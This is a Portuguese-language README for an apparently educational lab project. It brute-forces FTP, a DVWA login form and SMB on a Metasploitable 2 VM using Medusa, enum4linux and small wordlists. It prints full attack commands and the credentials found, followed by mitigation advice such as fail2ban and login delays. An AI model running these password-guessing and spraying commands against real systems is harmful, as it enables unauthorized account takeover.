# Projeto de Simulação de Ataques de Força Bruta

## 📋 Descrição do Projeto

Este projeto tem como objetivo simular ataques de força bruta em ambientes controlados utilizando Kali Linux e a ferramenta Medusa, com foco em três cenários distintos: FTP, formulário web (DVWA) e SMB. O ambiente foi configurado com duas máquinas virtuais em rede interna.

## 🎯 Objetivos de Aprendizado

- Compreender ataques de força bruta em diferentes serviços (FTP, Web, SMB)
- Utilizar Kali Linux e Medusa para auditoria de segurança
- Documentar processos técnicos de forma clara
- Reconhecer vulnerabilidades e propor medidas de mitigação

## 🛠️ Configuração do Ambiente

### Máquinas Virtuais
- **Kali Linux**: Máquina de ataque
- **Metasploitable 2**: Alvo vulnerável
- **DVWA**: Aplicação web vulnerável

### Configuração de Rede
- Tipo: Rede Interna (Host-only)
- IP Kali: `192.168.56.101`
- IP Metasploitable: `192.168.56.102`

## 📝 Cenários de Ataque Simulados

### 1. Força Bruta em FTP

#### Wordlist Criada
```bash
# wordlist_ftp.txt
admin
root
user
test
password
123456
ftp
ftpuser
anonymous
administrator
```

#### Comando Medusa
```bash
medusa -h 192.168.56.102 -U wordlist_ftp.txt -P wordlist_ftp.txt -M ftp -t 4
```

#### Parâmetros Explicados
- `-h`: IP do alvo
- `-U`: Arquivo com lista de usuários
- `-P`: Arquivo com lista de senhas
- `-M`: Módulo (ftp)
- `-t`: Número de threads

#### Validação de Acesso
```bash
ftp 192.168.56.102
# Login bem-sucedido com credenciais encontradas
```

#### Resultados Obtidos
- Credenciais válidas encontradas: `ftp:ftp`
- Tempo de execução: ~2 minutos
- Tentativas realizadas: 100 combinações

### 2. Automação em Formulário Web (DVWA)

#### Wordlist para DVWA
```bash
# wordlist_dvwa.txt
admin
admin123
password
123456
letmein
qwerty
```

#### Comando Medusa
```bash
medusa -h 192.168.56.102 -U wordlist_dvwa.txt -P wordlist_dvwa.txt -M http -m DIR:/dvwa/login.php -m FORM:'username=^USER^&password=^PASS^&Login=Login' -m DENY-SIGNAL:"Login failed"
```

#### Validação de Acesso
- Login bem-sucedido redireciona para `index.php`
- Sessão mantida com cookies
- Acesso às funcionalidades administrativas

#### Resultados
- Credencial encontrada: `admin:password`
- Taxa de sucesso: 1/36 tentativas
- Detectado mecanismo de bloqueio após múltiplas tentativas

### 3. Password Spraying em SMB

#### Enumeração de Usuários
```bash
enum4linux -U 192.168.56.102
```

#### Wordlist para SMB
```bash
# wordlist_smb.txt
Password1
Welcome1
Winter2024
Company123
```

#### Comando Medusa
```bash
medusa -h 192.168.56.102 -U usuarios_smb.txt -P wordlist_smb.txt -M smbnt -t 2
```

#### Validação
```bash
smbclient -L 192.168.56.102 -U usuario%senha
```

#### Resultados
- Usuários enumerados: 15 contas
- Credenciais válidas: 2 contas com senhas fracas
- Acesso a shares compartilhados

## 📊 Análise dos Resultados

### Estatísticas de Ataque
| Serviço | Tentativas | Sucessos | Taxa de Sucesso | Tempo |
|---------|------------|----------|-----------------|-------|
| FTP | 100 | 1 | 1% | 2min |
| DVWA | 36 | 1 | 2.7% | 1min |
| SMB | 60 | 2 | 3.3% | 3min |

### Vulnerabilidades Identificadas
1. **Senhas padrão/fáceis** em serviços FTP
2. **Configurações fracas** de autenticação web
3. **Políticas de senha inadequadas** no SMB
4. **Falta de mecanismos** de bloqueio eficazes

## 🛡️ Recomendações de Mitigação

### Para Administradores de Sistema

#### 1. Políticas de Senha Fortes
```bash
# Exemplo de política mínima
- Comprimento mínimo: 12 caracteres
- Complexidade obrigatória
- Rotação periódica
- Bloqueio após 5 tentativas falhas
```

#### 2. Proteção Contra Força Bruta
```bash
# Fail2ban configuration para FTP
[ftpd]
enabled = true
port = ftp,ftp-data,ftps,ftps-data
filter = ftpd
logpath = /var/log/vsftpd.log
maxretry = 3
bantime = 3600
```

#### 3. Hardening de Serviços
- Desabilitar usuários anônimos no FTP
- Implementar autenticação de dois fatores no DVWA
- Restringir acesso SMB por IP

### Para Desenvolvedores

#### 4. Proteções em Aplicações Web
```php
// Implementar delays progressivos
function login_attempt_delay($username) {
    $attempts = get_failed_attempts($username);
    $delay = min($attempts * 2, 30); // Máximo 30 segundos
    sleep($delay);
}

// CAPTCHA após múltiplas tentativas
if ($failed_attempts > 3) {
    require_captcha_validation();
}
```

#### 5. Monitoramento e Logging
```bash
# Monitorar tentativas de login
grep "Failed password" /var/log/auth.log
grep "authentication failure" /var/log/secure
```

## 🔍 Lições Aprendidas

### Técnicas
1. **Enumeração é crucial**: Conhecer os usuários aumenta drasticamente o sucesso
2. **Wordlists inteligentes**: Listas contextuais são mais eficazes que genéricas
3. **Taxa de requisições**: Muito alta gera bloqueios, muito baixa é ineficiente

### Ferramentas
- **Medusa**: Versátil para múltiplos protocolos
- **Enum4linux**: Eficaz para enumeração SMB
- **Custom scripts**: Necessários para cenários específicos

### Segurança
- **Múltiplas camadas**: Defesa em profundidade é essencial
- **Monitoramento proativo**: Detectar antes que seja explorado
- **Educação de usuários**: Fator humano crítico

## 📚 Próximos Passos

1. Explorar outras ferramentas (Hydra, Ncrack)
2. Implementar ataques com listas maiores
3. Testar técnicas de evasão (rotação de IPs, delays)
4. Desenvolver scripts de automação customizados

## ⚠️ Aviso Legal

Este projeto foi realizado **exclusivamente** em ambiente controlado para fins educacionais. O teste de penetração sem autorização explícita é ilegal e antiético.

---

**Autor**: [Seu Nome]  
**Data**: [Data do Projeto]  
**Repositório**: [Link do GitHub]